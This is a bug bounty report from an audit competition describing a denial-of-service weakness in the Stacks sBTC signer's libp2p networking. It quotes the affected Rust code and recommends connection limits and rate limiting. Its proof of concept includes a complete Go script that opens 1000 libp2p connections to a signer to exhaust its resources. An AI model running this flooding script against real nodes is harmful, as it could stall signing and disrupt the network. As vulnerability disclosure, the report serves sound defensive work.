# #42752 \[BC-High] Signer can be DOSed through their libp2p component

**Submitted on Mar 25th 2025 at 19:31:11 UTC by @leadwiz for** [**Attackathon | Stacks II**](https://immunefi.com/audit-competition/stacks-attackathon-2)

* **Report ID:** #42752
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_1.0>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

The `Signer` service in the protocol stack implements a libp2p-based peer-to-peer networking layer via `SwarmBuilder`. While this enables decentralized communication for signing duties (e.g., pubsub-based coordination), it also introduces a significant **Denial of Service (DoS)** vulnerability. Any external peer can initiate TCP/libp2p connections to the signer node and cause resource exhaustion — leading to degraded performance or full signer unavailability.

This issue arises from unprotected usage of the `SwarmBuilder` and lack of early-stage peer filtering or connection gating.

## Vulnerability Details

The signer node initializes a libp2p swarm as follows:

```
    async fn run_libp2p_swarm(ctx: impl Context) -> Result<(), Error> {
        tracing::info!("initializing the p2p network");

        // Build the swarm.
        tracing::debug!("building the libp2p swarm");
        let config = ctx.config();

        let enable_quic = config.signer.p2p.is_quic_used();

        let mut swarm = SignerSwarmBuilder::new(&config.signer.private_key)
            .add_listen_endpoints(&ctx.config().signer.p2p.listen_on)
            .add_seed_addrs(&ctx.config().signer.p2p.seeds)
            .add_external_addresses(&ctx.config().signer.p2p.public_endpoints)
            .enable_mdns(config.signer.p2p.enable_mdns)
            .enable_quic_transport(enable_quic)
            .build()?;

        // Start the libp2p swarm. This will run until either the shutdown signal is
        // received, or an unrecoverable error has occurred.
        tracing::info!("starting the libp2p swarm");
        swarm
            .start(&ctx)
            .in_current_span()
            .await
            .map_err(Error::SignerSwarm)
    }
```

This opens a public port (typically `/ip4/0.0.0.0/tcp/PORT/p2p/PEER_ID`) which any peer can connect to. There are **no restrictions** at the connection layer (e.g., libp2p's `ConnectionGater`) or rate limits. As a result, the signer accepts and processes incoming libp2p connection attempts from any peer, which includes:

* TCP connection establishment
* libp2p handshake (identify, ping, etc.)
* potential gossip/ping/autonat protocols

Even if peers are later rejected based on business logic (`is_allowed_peer()`), this happens **after** connection establishment, consuming CPU and memory.

***

## Impact Details

This vulnerability enables an **unauthenticated attacker** to:

* Initiate hundreds or thousands of connections per second to the signer node.
* Consume system resources (CPU, memory, file descriptors).
* Stall or disrupt signing operations due to swarm loop congestion or libp2p thread starvation.
* Prevent authorized peers from connecting or propagating signing messages in time.
* Potentially crash the signer due to resource exhaustion, or trigger OOM kills if not rate-limited by OS.

The signer is responsible for critical operations and availability is essential.

This risk is **amplified** if:

* The signer is part of a threshold set (and quorum depends on its presence).
* There is no auto-recovery or failover mechanism.

***

## Recommendations

To mitigate this issue:

1. **Set `ConnectionLimits`** on `SwarmBuilder` to cap incoming and total connections:

   ```
   ConnectionLimits::default()
       .with_max_established(100)
       .with_max_pending_incoming(Some(50))
   ```
2. **Track and rate-limit connections by IP address** using a lightweight in-memory structure.

## References

[DOS Mitigation](https://docs.libp2p.io/concepts/security/dos-mitigation/)

## Proof of Concept

## Proof of Concept

1. Change `docker/docker-compose.yml` so the p2p port is exposed.

```
diff --git a/docker/docker-compose.yml b/docker/docker-compose.yml
index 55bfab2e..94d9a349 100644
--- a/docker/docker-compose.yml
+++ b/docker/docker-compose.yml
@@ -172,7 +172,8 @@ services:
       SIGNER_SIGNER__PROMETHEUS_EXPORTER_ENDPOINT: 0.0.0.0:9181
     ports:
       - "8801:8801"
-
+      - "4122:4122"
+      - "9181:9181"
   # sbtc signer 2 ----
   postgres-2:
     <<: *postgres # Inherit all from the "postgres" service
```

2. Run `make devenv-up`
3. Replace the in the script below and run the script, while monitoring the CPU consumption.

```
package main

import (
	"context"
	"log"
	"sync"
	"time"

	libp2p "github.com/libp2p/go-libp2p"
	peer "github.com/libp2p/go-libp2p/core/peer"
	ma "github.com/multiformats/go-multiaddr"
)

const (
	numInstances = 1000
)

var (
	semaphore = make(chan struct{}, 100) // limit concurrency
)

func connectAndClose(targetPeerInfo peer.AddrInfo, instanceID int, wg *sync.WaitGroup) {
	defer wg.Done()
	semaphore <- struct{}{}        // acquire
	defer func() { <-semaphore }() // release

	ctx := context.Background()

	h, err := libp2p.New()
	if err != nil {
		log.Printf("[Instance %d] Failed to create host: %s", instanceID, err)
		return
	}
	log.Printf("[Instance %d] Created host with peer ID %s", instanceID, h.ID())

	if err := h.Connect(ctx, targetPeerInfo); err != nil {
		log.Printf("[Instance %d] Connection failed: %s", instanceID, err)
		_ = h.Close()
		return
	}
	log.Printf("[Instance %d] Connected successfully.", instanceID)

	time.Sleep(5 * time.Second)

	if err := h.Close(); err != nil {
		log.Printf("[Instance %d] Error closing host: %s", instanceID, err)
	} else {
		log.Printf("[Instance %d] Host closed.", instanceID)
	}
}

func main() {
	target := "/ip4/<IP>/tcp/4122/p2p/16Uiu2HAmJCCQmWYiiQDxD88SGWKiPc6XgXLRKZhu8jMmyzdpQXSV"

	maddr, err := ma.NewMultiaddr(target)
	if err != nil {
		log.Fatalf("Invalid multiaddress: %s", err)
	}

	peerInfo, err := peer.AddrInfoFromP2pAddr(maddr)
	if err != nil {
		log.Fatalf("Failed to parse peer info: %s", err)
	}

	log.Printf("Starting connection test with %d instances...", numInstances)

	var wg sync.WaitGroup
	for i := 0; i < numInstances; i++ {
		wg.Add(1)
		go connectAndClose(*peerInfo, i, &wg)
	}
	wg.Wait()

	log.Println("All connections completed.")
}

```
